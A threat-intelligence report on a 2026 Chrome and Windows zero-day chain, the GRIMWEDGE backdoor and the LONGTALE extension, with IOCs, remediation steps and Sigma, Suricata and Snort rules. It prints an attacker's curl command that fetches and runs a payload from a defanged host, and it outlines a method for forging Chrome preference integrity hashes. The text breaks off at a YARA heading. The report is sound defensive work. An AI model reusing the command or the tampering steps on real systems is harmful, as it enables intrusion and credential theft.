# Technical Analysis Report: UTA0560 GRIMWEDGE Chrome-Windows Zero-Day Chain (2026-09-15)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-09-15
Version: 1.1 (REVISED)

## Executive Summary

On September 1, 2026, Chinese threat actor UTA0560 launched spear-phishing campaigns against multiple non-governmental organizations (NGOs), exploiting a three-vulnerability zero-day chain in Google Chrome and Microsoft Windows to deploy a JavaScript backdoor dubbed GRIMWEDGE. The exploit chain combined CVE-2026-85046 (Chrome V8 type confusion), CVE-2026-87491 (Chrome WebAssembly sandbox escape), and CVE-2026-85880 (Windows kernel privilege escalation via RtlpCreateServerAcl) to achieve arbitrary code execution from a single malicious link. A second China-nexus actor, JungleBamboo (APT31/Violet Typhoon), used the identical exploit chain simultaneously to deploy SUPERSTOMP and the LONGTALE credential-stealing Chrome extension, suggesting a shared exploit supplier. Volexity's Network Security Monitoring service detected the campaign on September 1 and published a detailed analysis on September 9, 2026. All three vulnerabilities existed in a "patch gap" -- fixed in upstream Chromium source but not yet shipped in a stable Chrome release at the time of exploitation.

## Background: Chrome-Windows Patch Gap Exploitation

Google Chrome, with billions of users worldwide, is a high-value target for state-sponsored actors. The open-source Chromium project accepts vulnerability fixes that enter the public codebase before being shipped in a Chrome stable release. This creates a window -- the "patch gap" -- during which sophisticated actors can study the fix, develop an exploit, and weaponize it before end users receive protection. CVE-2026-85046 was reported to Chromium on August 4, 2026 by a private security researcher. A fix entered the open-source codebase, but had not reached a Chrome stable release by September 1, making this technically an N-day at source level but a zero-day for Chrome users. The Windows kernel component (CVE-2026-85880) provided the privilege escalation needed to escape Chrome's sandboxed renderer process.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-08-04 | CVE-2026-85046 reported to Chromium project |
| 2026-08-06 | Silent Chrome extension installation technique added to public GitHub repository |
| 2026-08-27 to 2026-08-29 | Exploit development (build timestamps: `BUILD = "b20260829a"`) |
| 2026-08-31 | msgbox.exe (GRIMWEDGE loader) compiled |
| 2026-09-01 | UTA0560 phishing campaign targeting NGOs begins |
| 2026-09-01 | JungleBamboo phishing via `hxxps://photos[.]msbenefit[.]com/fa/t3` |
| 2026-09-01 | Volexity NSM service detects UTA0560 campaign |
| 2026-09-02 | wsc.dll recompiled; JungleBamboo second phishing wave via `hxxps://proof[.]gitprogram[.]com/a4/j8` |
| 2026-09-08 | Chrome release enables legacy-MAC fallback (default) |
| 2026-09-09 | Volexity publishes full analysis |

## Root Cause: Spear-Phishing via XSS Redirect

The initial access vector was spear-phishing emails sent from `ircribbin77[at]hotmail[.]com` (persona "Irma Cribbin"), encouraging recipients to click links leading to a legitimate U.S.-based university website. The university site harbored a reflected cross-site scripting (XSS) vulnerability that UTA0560 exploited to redirect victims to attacker-controlled infrastructure hosting the multi-stage exploit chain. The phishing lures used donation-form themes targeting NGOs, consistent with earlier UTA0560 campaigns from March 2026.

## Technical Analysis of the Malicious Payload

### 1. Exploit Delivery (BlueMoon Chain)

The exploit chain was delivered via a JavaScript loader (`react.min.js`, SHA256: `337b48c1cd6dd6e7b8073327082a60e149517fa084ba17b180e041fffa3b130d`) hosted at `hxxps://cloud[.]shinewrist[.]net`. This loader:

- Presented a **decoy donation form image** to the victim
- Gated execution based on User-Agent: only Chrome on Windows proceeded
- Loaded `page.html` (SHA256: `7a52ff23949edee8faa61ce0def6dbca8b7e5943c54d23376cc190762ea3985c`) with 13 configurable parameters
- Executed the exploit inside a **Web Worker** to prevent tab crashes from alerting the victim
- Supported automatic retry (up to 5 attempts) on failed exploitation

The `page.html` exploit contained three embedded Base64-encoded binary payloads (p1, p2, pp) executing sequentially:

**p1 -- Host Reconnaissance:** Reflectively loaded a Windows DLL (SHA256: `b7b0cd6539464ab39c6526e499f86d611faa21c5af945535ebaf187cec543af1`) that collected a JSON profile including OS version/build/architecture, process token privileges and integrity level, CPUID features, and hypervisor detection (VMware, Hyper-V, KVM, Xen vendor strings). Debugger/sandbox indicators were reported but not acted upon.

**p2 -- Windows Kernel LPE:** Exploited CVE-2026-85880 in `RtlpCreateServerAcl` (SHA256: `51462a23ac25e1bd0e49b7cae7f3a71f8d2201e22d45175b587e4740b49863cc`). Conditional execution: only ran if the process was non-elevated, targeting Windows 10 1809-22H2, Server 2022, and Windows 11 21H2 (rejected builds above version 22000).

**pp -- Browser Process Injection:** Position-independent shellcode running in an elevated context. Injected into the Chrome browser process using `CreateProcessA` and executed:

```
cmd.exe /c curl -f -sS -o "%TEMP%\msgbox.exe" "hxxps://cloud[.]shinewrist[.]net/<removed>/msgbox.exe" && "%TEMP%\msgbox.exe"
```

### 2. GRIMWEDGE Backdoor Deployment (DLL Sideloading)

The downloaded `msgbox.exe` (SHA256: `69c1603f3f9015beb0097d0a3bb0f17400c314e2eae65a7eceacd3b93ea570dc`) is a dropper that extracts from its PE resources:

1. A legitimate Windows executable
2. `wsc.dll` (SHA256: `3b71d721c39fad92a44ddd764bbb34afeae44a5db886d0a4827a399a5fbd367f`) -- the malicious DLL sideloaded by the legitimate binary

`wsc.dll` beacons to a per-host staging URL (`hxxps://cloud[.]shinewrist[.]net/<removed>/%COMPUTERNAME%.txt`) and executes an MSI via `msiexec /i`. The MSI file (`Temp.txt`, SHA256: `56eda0ac82e06ee609b034306025e67df161c5877399c305c8eaea136e80c951`, 408 KB, built with Advanced Installer 14.5.2) contains obfuscated JScript in custom actions that is eval'd in-memory within the msiexec.exe process.

The resulting GRIMWEDGE backdoor (SHA256: `59dc108e22cb856c228bbf8a1ab955fb66f0844a07fe10fa0d9fc3823d2cbbcb`) is a compact (<250 lines) JScript backdoor with 10 commands:

| Command ID | Name | Function |
|------------|------|----------|
| 0 | Info | OS version, build, architecture, hotfixes, AV, domain/user/computer, IP/MAC, drives, installed software |
| 1 | Dir | Directory listing with timestamps and sizes |
| 2 | Mkdir | Create directory |
| 3 | Del | Delete file/directory |
| 4 | Tasklist | PID, owning user, full command line |
| 5 | Taskkill | Kill process by PID |
| 6 | Type | Read file contents (up to 5 MB) |
| 7 | Run | Execute command in hidden window |
| 8 | Upload (chunk) | Base64-decoded data from C2 written to memory buffer |
| 9 | Upload (commit) | Write accumulated buffer to disk |

### 3. C2 Infrastructure

**GRIMWEDGE C2:** `hxxps://ocr[.]opusaccel[.]top`
- Protocol: HTTPS POST
- POST body: tab-delimited fields (domain, username, command output)
- C2 responses evaluated as JScript code via `eval()`
- No built-in persistence, lateral movement, or exfiltration beyond file-read and upload commands

**UTA0560 Infrastructure:**
- Exploit hosting and staging: `cloud[.]shinewrist[.]net` (IP: `206[.]166[.]251[.]164`)
- Per-host beacon pattern: `/%COMPUTERNAME%.txt`
- Phishing sender: `ircribbin77[at]hotmail[.]com`

**Persistence:** Scheduled task named **"Windows Scheduled System"** executing every 5 minutes to re-run the MSI sideloading chain.

### 4. JungleBamboo / APT31 Parallel Campaign

A second China-nexus actor (JungleBamboo/APT31/Violet Typhoon/TA412) used the identical exploit chain simultaneously with distinct post-exploitation tooling:

**SUPERSTOMP** (SHA256: `e2a59432ce2b0d83ded936374a11fca3d3defaf4aab90eb37fca58683eae32c0`): Downloads and installs the LONGTALE Chrome extension by tampering with Chrome's Secure Preferences file. Bypasses November 2025 per-preference `_encrypted_hash` and June 2026 `super_encrypted_hash` integrity checks by:
1. Copying existing Secure Preferences
2. Removing encrypted hash entries
3. Adding the malicious extension with required settings
4. Generating legacy HMAC values
5. Replacing the original file

**LONGTALE** Chrome Extension (SHA256: `5eb5645511b00e4f4d73125654eeb3a3930fcf09c65685dc7f03f725331492e3`):
- Extension ID: `ckiknalbeplpcpofpnabcnhjcegckfei`
- Masquerades as Google Gemini extension
- Capabilities: keylogging, form capture, cookie/session theft, keyword-triggered screenshots (JPEG), bulk data exfiltration (~30-second intervals)
- 14 remote commands for configuration and on-demand collection
- Downloaded from `hxxps://xyz0102[.]gitprogram[.]com/a001`

**JungleBamboo Infrastructure:**
- `msbenefit[.]com` (phishing)
- `gitprogram[.]com` (phishing and C2)
- Both use Cloudflare Tunnels (resolving via `*.cfargotunnel[.]com`)

### 5. Anti-Forensics / Evasion Techniques

- **Web Worker execution:** Exploit runs in a Web Worker to prevent tab crashes from alerting the victim
- **Conditional exploitation:** p2 kernel LPE only executes against specific Windows builds, avoiding crashes on unsupported versions
- **DLL sideloading:** Malicious code loads via a legitimate Windows binary to evade static detection
- **In-memory execution:** GRIMWEDGE JScript runs in-memory within msiexec.exe, leaving minimal disk artifacts
- **MSI disguise:** Malicious installer disguised as `Temp.txt` with `.msi` format
- **Chrome integrity bypass:** SUPERSTOMP forges legacy HMAC values to bypass Chrome's Secure Preferences protections

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1[.]2[.]3[.]4`)
> - Email addresses: `[at]` replacing @ (e.g., `attacker[at]evil[.]com`)

### File System

| Platform | Path / File | Hash (SHA256) | Description |
|----------|-------------|---------------|-------------|
| Windows | page.html | `7a52ff23949edee8faa61ce0def6dbca8b7e5943c54d23376cc190762ea3985c` | Exploit delivery page (shared) |
| Windows | p1 DLL | `b7b0cd6539464ab39c6526e499f86d611faa21c5af945535ebaf187cec543af1` | Host reconnaissance payload (shared) |
| Windows | p2 DLL | `51462a23ac25e1bd0e49b7cae7f3a71f8d2201e22d45175b587e4740b49863cc` | Windows kernel LPE payload (shared) |
| Windows | Files1.html | `d17053557bb90298f7b115432b4820a248fdbe678bca31721529b1f51a82343b` | UTA0560 landing page |
| Windows | react.min.js | `337b48c1cd6dd6e7b8073327082a60e149517fa084ba17b180e041fffa3b130d` | UTA0560 JavaScript loader |
| Windows | %TEMP%\msgbox.exe | `69c1603f3f9015beb0097d0a3bb0f17400c314e2eae65a7eceacd3b93ea570dc` | GRIMWEDGE dropper/loader |
| Windows | wsc.dll | `3b71d721c39fad92a44ddd764bbb34afeae44a5db886d0a4827a399a5fbd367f` | Malicious sideloaded DLL |
| Windows | Temp.txt | `56eda0ac82e06ee609b034306025e67df161c5877399c305c8eaea136e80c951` | GRIMWEDGE MSI installer |
| Windows | (in-memory) | `59dc108e22cb856c228bbf8a1ab955fb66f0844a07fe10fa0d9fc3823d2cbbcb` | GRIMWEDGE JScript backdoor |
| Windows | msgbox.exe | `e2a59432ce2b0d83ded936374a11fca3d3defaf4aab90eb37fca58683eae32c0` | SUPERSTOMP loader (JungleBamboo) |
| Windows | a001 | `5eb5645511b00e4f4d73125654eeb3a3930fcf09c65685dc7f03f725331492e3` | LONGTALE Chrome extension (JungleBamboo) |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | cloud[.]shinewrist[.]net | UTA0560 exploit hosting and staging |
| Domain | ocr[.]opusaccel[.]top | GRIMWEDGE C2 server |
| IP | 206[.]166[.]251[.]164 | Hosts cloud[.]shinewrist[.]net |
| Domain | msbenefit[.]com | JungleBamboo phishing |
| Domain | gitprogram[.]com | JungleBamboo phishing and C2 |
| Domain | xyz0102[.]gitprogram[.]com | LONGTALE extension download |
| URL | hxxps://cloud[.]shinewrist[.]net/&lt;path&gt;/Files1.html | UTA0560 landing page |
| URL | hxxps://cloud[.]shinewrist[.]net/&lt;path&gt;/react.min.js | UTA0560 JS loader |
| URL | hxxps://cloud[.]shinewrist[.]net/&lt;path&gt;/page.html?mode=payload | Exploit delivery |
| URL | hxxps://cloud[.]shinewrist[.]net/&lt;path&gt;/msgbox.exe | Payload download |
| URL | hxxps://photos[.]msbenefit[.]com/fa/t3 | JungleBamboo phishing (Sep 1) |
| URL | hxxps://proof[.]gitprogram[.]com/a4/j8 | JungleBamboo phishing (Sep 2) |
| URL | hxxps://xyz0102[.]gitprogram[.]com/a001 | LONGTALE download |
| Email | ircribbin77[at]hotmail[.]com | UTA0560 phishing sender ("Irma Cribbin") |
| Chrome Ext ID | ckiknalbeplpcpofpnabcnhjcegckfei | LONGTALE malicious extension |

### Behavioral

- **Scheduled task** named "Windows Scheduled System" with 5-minute execution interval for persistence
- **DLL sideloading** via legitimate Windows binary loading `wsc.dll`
- **msiexec.exe** executing an MSI file named `Temp.txt`
- **Per-host beacon** to `%COMPUTERNAME%.txt` on staging server
- **GRIMWEDGE C2 protocol:** HTTPS POST with tab-delimited body (domain, username, command output); responses eval'd as JScript
- **Chrome Secure Preferences tampering** removing `_encrypted_hash` and `super_encrypted_hash` entries

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1566.002 | Spearphishing Link | Phishing emails with links to XSS-vulnerable university website |
| T1189 | Drive-by Compromise | XSS redirect to attacker-controlled exploit page |
| T1203 | Exploitation for Client Execution | CVE-2026-85046 (V8 type confusion) and CVE-2026-87491 (sandbox escape) |
| T1068 | Exploitation for Privilege Escalation | CVE-2026-85880 (Windows kernel RtlpCreateServerAcl) |
| T1106 | Native API | Shellcode uses CreateProcessA to spawn cmd.exe for payload delivery |
| T1574.002 | DLL Side-Loading | msgbox.exe extracts legitimate EXE + malicious wsc.dll |
| T1218.007 | Msiexec | GRIMWEDGE delivered via msiexec /i Temp.txt |
| T1059.007 | JavaScript | GRIMWEDGE JScript backdoor executed in-memory via eval() |
| T1053.005 | Scheduled Task | "Windows Scheduled System" task for 5-minute persistence |
| T1105 | Ingress Tool Transfer | curl downloads msgbox.exe to %TEMP% |
| T1071.001 | Web Protocols | C2 communication via HTTPS POST to ocr[.]opusaccel[.]top |
| T1082 | System Information Discovery | GRIMWEDGE Info command collects OS, hardware, AV, network details |
| T1057 | Process Discovery | GRIMWEDGE Tasklist command enumerates processes with PIDs and command lines |
| T1083 | File and Directory Discovery | GRIMWEDGE Dir command lists directories |
| T1176 | Browser Extensions | LONGTALE malicious Chrome extension masquerading as Google Gemini |

## Impact Assessment

**Breadth:** Multiple NGOs targeted simultaneously by at least two distinct Chinese threat actors. The shared exploit chain suggests a coordinated supply or marketplace for exploits among China-nexus groups.

**Depth:** Full system compromise -- the exploit chain achieves kernel-level code execution from a single link click, enabling deployment of arbitrary payloads. GRIMWEDGE provides complete remote access (file management, command execution, file upload/download). LONGTALE provides persistent credential theft within Chrome.

**Stealth:** High evasion capabilities -- Web Worker execution prevents visible tab crashes, in-memory JScript execution minimizes disk artifacts, DLL sideloading evades static analysis, and Chrome extension masquerades as legitimate Google Gemini.

**Patch Gap Risk:** Volexity assesses with high confidence that LLM-accelerated vulnerability research increases patch-gap exploitation risk, as threat actors can more rapidly develop exploits in the window between upstream fix and stable release.

## Detection & Remediation

### Immediate Detection

1. **Search for scheduled task:** `schtasks /query /tn "Windows Scheduled System"` -- presence indicates GRIMWEDGE persistence
2. **Search for Chrome extension:** Check `chrome://extensions` for ID `ckiknalbeplpcpofpnabcnhjcegckfei` (LONGTALE)
3. **Search DNS logs** for queries to `opusaccel[.]top` or `shinewrist[.]net`
4. **Search proxy/firewall logs** for connections to `206[.]166[.]251[.]164`
5. **Search for file hashes** listed in the IOC table above across endpoint telemetry
6. **Search for `msgbox.exe`** in `%TEMP%` directories across the enterprise

### Remediation

1. **Immediately update Chrome** to the latest stable release (patches CVE-2026-85046 and CVE-2026-87491)
2. **Apply Windows security updates** addressing CVE-2026-85880
3. **Isolate compromised hosts** and collect forensic images
4. **Remove** the "Windows Scheduled System" scheduled task
5. **Remove** LONGTALE Chrome extension and reset Chrome Secure Preferences
6. **Block** all IOC domains and IPs at the network perimeter
7. **Reset credentials** for any users on compromised systems
8. **Review** Chrome extensions across the organization for unauthorized installations

### Long-Term Hardening

1. **Reduce patch gap exposure:** Enable Chrome's automatic update mechanism and consider Chrome Enterprise policies for rapid update enforcement
2. **Browser extension management:** Deploy Chrome Enterprise policies restricting extension installation to an approved allowlist
3. **Network segmentation:** Restrict outbound HTTPS from workstations to known-good destinations where feasible
4. **XSS mitigation:** Engage with partner universities and organizations about reflected XSS vulnerabilities that can be weaponized as redirect vectors
5. **Endpoint monitoring:** Deploy Sysmon or equivalent to capture process creation, DLL loading, and scheduled task events for detection coverage

## Detection Rules

These detections target campaign-specific artifacts from the UTA0560 GRIMWEDGE operation and JungleBamboo parallel campaign. PoC/advisory-specific altitude (default); all Sigma rules convert cleanly to Splunk and CrowdStrike LogScale. Compiles does not equal fires -- verify in your pipeline with representative telemetry.

### Sigma: UTA0560 GRIMWEDGE Scheduled Task Persistence

Detects creation of the "Windows Scheduled System" scheduled task used by GRIMWEDGE for 5-minute persistence.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check failed (MITRE ATT&CK data fetch 403 via proxy); sigma convert splunk exit 0; sigma convert log_scale exit 0. Task name "Windows Scheduled System" is campaign-specific and unlikely to appear in benign environments. No known FP. -->

```yaml
title: UTA0560 GRIMWEDGE Scheduled Task Persistence
id: 8c7e1a3f-2d4b-4e9a-b6c5-1f0d8e7a3b2c
status: experimental
description: >
    Detects creation of the "Windows Scheduled System" scheduled task used by the
    GRIMWEDGE backdoor for persistence with a 5-minute execution interval.
references:
    - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
    - https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
author: Actioner
date: 2026/09/15
tags:
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: 'Windows Scheduled System'
    condition: selection_schtasks
falsepositives:
    - Unlikely - distinctive task name specific to this campaign
level: high
```

### Sigma: UTA0560 GRIMWEDGE Known C2 Domain DNS Query

Detects DNS queries to known UTA0560 C2 domains `opusaccel[.]top` and `shinewrist[.]net`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check failed (MITRE ATT&CK data fetch 403 via proxy); sigma convert splunk exit 0; sigma convert log_scale exit 0. Domains are campaign-specific infrastructure. No benign use known. -->

```yaml
title: UTA0560 GRIMWEDGE Known C2 Domain DNS Query
id: 4f2e8b1c-7a3d-4c6e-9d5f-0b1a2c3d4e5f
status: experimental
description: >
    Detects DNS queries to known UTA0560 and GRIMWEDGE command-and-control domains
    including ocr.opusaccel.top and cloud.shinewrist.net.
references:
    - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
    - https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
author: Actioner
date: 2026/09/15
tags:
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith:
            - 'opusaccel.top'
            - 'shinewrist.net'
    condition: selection
falsepositives:
    - Unlikely - domains are specific to this campaign infrastructure
level: critical
```

### Sigma: UTA0560 Exploit Chain Curl Payload Download

Detects cmd.exe spawning curl to download `msgbox.exe` from `shinewrist[.]net`, matching the GRIMWEDGE delivery stage.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check failed (MITRE ATT&CK data fetch 403 via proxy); sigma convert splunk exit 0; sigma convert log_scale exit 0. Combination of msgbox.exe filename + shinewrist domain is uniquely specific to this campaign's browser injection → download chain. -->

```yaml
title: UTA0560 Exploit Chain Curl Payload Download to TEMP
id: 6a9c3e2d-5b4f-4d7e-8c1a-3f0e9d2b6c5a
status: experimental
description: >
    Detects the cmd.exe spawning curl to download msgbox.exe to the user TEMP directory,
    consistent with the UTA0560 browser exploit chain payload delivery stage.
references:
    - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
    - https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
author: Actioner
date: 2026/09/15
tags:
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\cmd.exe'
        Image|endswith: '\curl.exe'
        CommandLine|contains|all:
            - 'msgbox.exe'
            - 'shinewrist'
    condition: selection
falsepositives:
    - Unlikely - combination of msgbox.exe filename and shinewrist domain is highly specific
level: critical
```

### Sigma: UTA0560 GRIMWEDGE MSI Sideload Execution

Detects msiexec.exe executing an MSI file named `Temp.txt`, consistent with GRIMWEDGE delivery via DLL sideloading. Caveat: "Temp.txt" as an MSI filename is rare but not impossible in legitimate software packaging.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check failed (MITRE ATT&CK data fetch 403 via proxy); sigma convert splunk exit 0; sigma convert log_scale exit 0. Medium confidence because "Temp.txt" alone is not fully unique without additional context. Consider pairing with wsc.dll or scheduled task rules. -->

```yaml
title: UTA0560 GRIMWEDGE MSI Sideload Execution
id: 2b8d4f1e-9c3a-4e7d-b5f6-7a0c1d2e3f4a
status: experimental
description: >
    Detects msiexec.exe executing a suspicious MSI file named Temp.txt, consistent with
    GRIMWEDGE backdoor delivery via DLL sideloading and MSI custom action execution.
references:
    - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
    - https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
author: Actioner
date: 2026/09/15
tags:
    - attack.t1218.007
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\msiexec.exe'
        CommandLine|contains|all:
            - '/i'
            - 'Temp.txt'
    condition: selection
falsepositives:
    - Legitimate MSI files named Temp.txt are extremely rare
level: high
```

### Suricata: UTA0560 GRIMWEDGE C2 and Exploit Infrastructure

Detects TLS connections and DNS queries to known UTA0560 campaign domains `ocr[.]opusaccel[.]top` and `cloud[.]shinewrist[.]net`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. Four rules: TLS SNI match on both C2 and exploit domains, plus DNS query detection for both parent domains. Campaign-specific infrastructure with no known benign overlap. -->

```suricata
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS SNI to GRIMWEDGE C2 Domain ocr.opusaccel.top"; flow:established,to_server; tls.sni; content:"ocr.opusaccel.top"; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200001; rev:1;)

alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS SNI to UTA0560 Exploit Hosting Domain cloud.shinewrist.net"; flow:established,to_server; tls.sni; content:"cloud.shinewrist.net"; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200002; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to GRIMWEDGE C2 Domain opusaccel.top"; flow:to_server; dns.query; content:"opusaccel.top"; nocase; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200003; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to UTA0560 Exploit Domain shinewrist.net"; flow:to_server; dns.query; content:"shinewrist.net"; nocase; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200004; rev:1;)
```

### Snort: UTA0560 C2 Domain Detection

Detects TLS ClientHello traffic containing the `opusaccel[.]top` or `shinewrist[.]net` domain strings in the payload.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c /etc/snort/snort.conf -T exit 0 (rules placed in local.rules). Content match on distinctive domain labels in raw TCP payload. Campaign-specific domains. -->

```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - UTA0560 GRIMWEDGE C2 Domain in TLS ClientHello"; flow:established,to_server; content:"opusaccel"; fast_pattern; content:".top"; distance:0; within:5; sid:2100001; rev:1; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - UTA0560 Exploit Hosting Domain in TLS ClientHello"; flow:established,to_server; content:"shinewrist"; fast_pattern; content:".net"; distance:0; within:5; sid:2100002; rev:1; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/;)
```

### Sigma: JungleBamboo APT31 Known C2 Domain DNS Query

Detects DNS queries to known JungleBamboo/APT31 campaign domains `msbenefit[.]com` and `gitprogram[.]com`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. Domains are campaign-specific APT31 infrastructure documented by Volexity. No benign use known. -->
<!-- revision: added to close JungleBamboo IOC coverage gap identified by critic -->

```yaml
title: JungleBamboo APT31 Known C2 Domain DNS Query
id: 7d3f9e2a-1b5c-4a8d-9e6f-2c0d3b4a5e7f
status: experimental
description: >
    Detects DNS queries to known JungleBamboo/APT31 campaign domains including
    msbenefit.com and gitprogram.com used for phishing and C2 in the parallel
    Chrome-Windows zero-day campaign.
references:
    - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
    - https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
author: Actioner
date: 2026/09/15
tags:
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith:
            - 'msbenefit.com'
            - 'gitprogram.com'
    condition: selection
falsepositives:
    - Unlikely - domains are specific to JungleBamboo/APT31 campaign infrastructure
level: critical
```

### Suricata: JungleBamboo APT31 C2 and Phishing Infrastructure

Detects TLS connections and DNS queries to known JungleBamboo/APT31 campaign domains `msbenefit[.]com` and `gitprogram[.]com`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. Campaign-specific APT31 infrastructure. No benign overlap known. -->
<!-- revision: added to close JungleBamboo IOC coverage gap identified by critic -->

```suricata
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS SNI to JungleBamboo APT31 Phishing Domain msbenefit.com"; flow:established,to_server; tls.sni; content:"msbenefit.com"; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200005; rev:1;)

alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS SNI to JungleBamboo APT31 C2 Domain gitprogram.com"; flow:established,to_server; tls.sni; content:"gitprogram.com"; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200006; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to JungleBamboo APT31 Phishing Domain msbenefit.com"; flow:to_server; dns.query; content:"msbenefit.com"; nocase; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200007; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to JungleBamboo APT31 C2 Domain gitprogram.com"; flow:to_server; dns.query; content:"gitprogram.com"; nocase; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/; metadata:author Actioner, created_at 2026-09-15; sid:2200008; rev:1;)
```

### Snort: JungleBamboo APT31 C2 Domain Detection

Detects TLS ClientHello traffic containing JungleBamboo/APT31 domain strings `msbenefit[.]com` and `gitprogram[.]com`.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c /etc/snort/snort.conf -T exit 0. Campaign-specific APT31 domains. -->
<!-- revision: added to close JungleBamboo IOC coverage gap identified by critic -->

```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - JungleBamboo APT31 Phishing Domain in TLS ClientHello"; flow:established,to_server; content:"msbenefit"; fast_pattern; content:".com"; distance:0; within:5; sid:2100003; rev:1; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - JungleBamboo APT31 C2 Domain in TLS ClientHello"; flow:established,to_server; content:"gitprogram"; fast_pattern; content:".com"; distance:0; within:5; sid:2100004; rev:1; classtype:trojan-activity; reference:url,www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/;)
```

### YARA: UTA0560 GRIMWEDGE JavaScript Backdoor

Detects the GRIMWEDGE JScript backdoor via its distinctive C2 domain and command handler function names.
**Status:** compile ✅ compiles · confidence: medium · sample: synthetic test only
<!-- audit: yarac exit 0. Positive sample was synthetic (constructed from published command names + C2 domain), not a real source-published sample. Negative sample (benign WScript usage) did not match. C2 domain "opusaccel.top" is unique; however, behavioral branch (4 of $cmd_* + 1 of $loader*) has FP risk because strings "Info", "Dir", "Type", "Run" are common English words and benign JScript with WScript.Shell could match. Downgraded from high to medium. -->
